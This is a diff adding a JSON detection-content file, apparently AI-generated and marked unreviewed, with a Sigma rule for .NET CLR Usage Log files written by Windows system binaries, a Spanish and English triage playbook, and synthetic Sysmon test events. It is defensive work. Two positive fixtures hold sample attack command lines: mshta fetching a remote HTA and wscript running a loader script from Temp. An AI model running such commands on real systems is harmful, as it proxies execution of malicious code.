@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
+    "title": "Suspicious DotNET CLR Usage Log Artifact",
+    "level": "high",
+    "status": "test",
+    "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
+    "path": "windows/file/file_event/file_event_win_net_cli_artefact.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "El CLR de .NET creó un archivo de Usage Log a nombre de un binario del sistema (mshta, wscript, cscript, rundll32, regsvr32, wmic, etc.) que normalmente no carga código .NET. Esto suele indicar que ese binario ejecutó un assembly .NET, una técnica común para ejecutar payloads mediante binarios legítimos.",
+      "what_it_detects": "Eventos de creación de archivos (Sysmon EventID 11) donde TargetFilename termina en \\UsageLogs\\<binario>.exe.log para cmstp, cscript, mshta, msxsl, regsvr32, rundll32, svchost, wscript o wmic. Se excluye rundll32 lanzado por MsiExec.exe -Embedding con zzzzInvokeManagedCustomActionOutOfProc y Temp en CommandLine (custom actions de instaladores MSI).",
+      "why_it_matters": "Corresponde a T1218 (System Binary Proxy Execution): el atacante usa binarios firmados de Windows para cargar assemblies .NET maliciosos en memoria (por ejemplo, scripts tipo DotNetToJScript) y evadir controles. El log solo se escribe una vez por sesión y proceso, así que suele ser el único rastro.",
+      "triage_steps": [
+        "Revise Image, TargetFilename y el usuario: identifique qué binario cargó el CLR, en qué perfil (usuario o systemprofile) y en qué host.",
+        "Analice ParentImage, ParentCommandLine y CommandLine del proceso; busque URLs, rutas en Temp/AppData, archivos .hta, .js, .vbs, .sct o .xsl, o DLL inusuales.",
+        "Lea el contenido del archivo .log: lista los assemblies cargados; nombres aleatorios, sin firma o fuera del GAC son sospechosos.",
+        "Pivote en el mismo host ±15 minutos: creación de procesos, procesos hijos, archivos escritos en Temp, cargas de DLL y conexiones de red del proceso.",
+        "Verifique si el archivo de Usage Log se borró o modificó después; borrarlo es una técnica conocida de evasión de EDR.",
+        "Busque alertas anteriores del mismo host y usuario, y el mismo hash o línea de comandos en otros endpoints.",
+        "Para svchost.exe.log, identifique el servicio alojado y si se instaló recientemente."
+      ],
+      "false_positives": [
+        "Rundll32 lanzado por msiexec.exe ejecutando custom actions administradas (zzzzInvokeManagedCustomActionOutOfProc) cuando el enriquecimiento de ParentImage/CommandLine no está disponible.",
+        "Scripts administrativos legítimos en wscript/cscript o herramientas internas que invocan objetos COM implementados en .NET.",
+        "Software de terceros o servicios en svchost que cargan componentes .NET de forma legítima; confirme firma y proveedor."
+      ],
+      "response_steps": [
+        "Verifique la legitimidad con el dueño del equipo o el equipo de TI antes de actuar; documente el contenido del Usage Log.",
+        "Si es malicioso, aísle el endpoint desde el EDR y preserve memoria, el .log, scripts y DLL relacionados.",
+        "Termine los procesos maliciosos, elimine persistencias y archivos de payload confirmados; bloquee hashes, dominios e IP observados.",
+        "Restablezca credenciales del usuario afectado si hubo posible robo de credenciales y busque la misma actividad en toda la flota."
+      ],
+      "severity_rationale": "Es alta porque estos binarios rara vez cargan .NET legítimamente y la principal exclusión benigna (custom actions MSI) ya está filtrada."
+    },
+    "en": {
+      "summary": "The .NET CLR created a Usage Log file named after a Windows system binary (mshta, wscript, cscript, rundll32, regsvr32, wmic, etc.) that normally does not run .NET code. This usually means that binary executed a .NET assembly, a common way to proxy payload execution.",
+      "what_it_detects": "File creation events (Sysmon EventID 11) where TargetFilename ends with \\UsageLogs\\<binary>.exe.log for cmstp, cscript, mshta, msxsl, regsvr32, rundll32, svchost, wscript or wmic. Rundll32 started by MsiExec.exe -Embedding with zzzzInvokeManagedCustomActionOutOfProc and Temp in CommandLine (MSI custom actions) is excluded.",
+      "why_it_matters": "Maps to T1218 (System Binary Proxy Execution): attackers use signed Windows binaries to load malicious .NET assemblies in memory (for example DotNetToJScript-style scripts) to evade defenses. The log is written only once per session and process, so it may be the only trace.",
+      "triage_steps": [
+        "Review Image, TargetFilename and the user: which binary loaded the CLR, under which profile (user or systemprofile) and on which host.",
+        "Inspect ParentImage, ParentCommandLine and CommandLine; look for URLs, Temp/AppData paths, .hta, .js, .vbs, .sct or .xsl files, or unusual DLLs.",
+        "Read the .log file content: it lists loaded assemblies; random, unsigned or non-GAC assembly names are suspicious.",
+        "Pivot on the same host +/- 15 minutes: process creation, child processes, files written to Temp, DLL loads and network connections from the process.",
+        "Check whether the Usage Log was later deleted or modified; tampering with it is a known EDR evasion technique.",
+        "Search earlier alerts for the same host and user, and the same hash or command line on other endpoints.",
+        "For svchost.exe.log, identify the hosted service and whether it was recently installed."
+      ],
+      "false_positives": [
+        "Rundll32 started by msiexec.exe running managed custom actions (zzzzInvokeManagedCustomActionOutOfProc) when ParentImage/CommandLine enrichment is missing.",
+        "Legitimate admin scripts in wscript/cscript or internal tools calling COM objects implemented in .NET.",
+        "Third-party software or svchost-hosted services that legitimately load .NET components; confirm signature and vendor."
+      ],
+      "response_steps": [
+        "Confirm legitimacy with the host owner or IT before acting; record the Usage Log content.",
+        "If malicious, isolate the endpoint via EDR and preserve memory, the .log file, and related scripts and DLLs.",
+        "Kill malicious processes, remove confirmed persistence and payload files; block observed hashes, domains and IPs.",
+        "Reset the affected user's credentials if theft is possible and hunt for the same activity fleet-wide."
+      ],
+      "severity_rationale": "High because these binaries rarely load .NET legitimately and the main benign case (MSI custom actions) is already filtered out."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "mshta.exe loads the CLR after running a remote HTA, creating its Usage Log in the user profile",
+        "event": {
+          "EventID": 11,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\SysWOW64\\mshta.exe",
+          "CommandLine": "\"C:\\Windows\\SysWOW64\\mshta.exe\" https://update.example.com/invoice.hta",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "TargetFilename": "C:\\Users\\jperez\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs\\mshta.exe.log",
+          "ProcessId": 6120
+        }
+      },
+      {
+        "description": "wscript.exe running a JScript file from Temp loads a .NET assembly",
+        "event": {
+          "EventID": 11,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\mrojas\\AppData\\Local\\Temp\\loader.js\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+          "TargetFilename": "C:\\Users\\mrojas\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\wscript.exe.log",
+          "ProcessId": 4388
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate MSI managed custom action: rundll32 started by MsiExec -Embedding, excluded by the filter",
+        "event": {
+          "EventID": 11,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "CommandLine": "rundll32.exe \"C:\\Users\\jperez\\AppData\\Local\\Temp\\MSI4F2A.tmp\",zzzzInvokeManagedCustomActionOutOfProc SfxCA_5112781 12 ExampleCA!ExampleCA.CustomActions.Install",
+          "ParentImage": "C:\\Windows\\System32\\MsiExec.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\MsiExec.exe -Embedding 3F1A2B4C5D6E7F8091A2B3C4D5E6F708 C",
+          "TargetFilename": "C:\\Users\\jperez\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\rundll32.exe.log",
+          "ProcessId": 7712
+        }
+      },
+      {
+        "description": "PowerShell Usage Log, a process not in the rule's list",
+        "event": {
+          "EventID": 11,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "TargetFilename": "C:\\Users\\jperez\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log",
+          "ProcessId": 5024
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
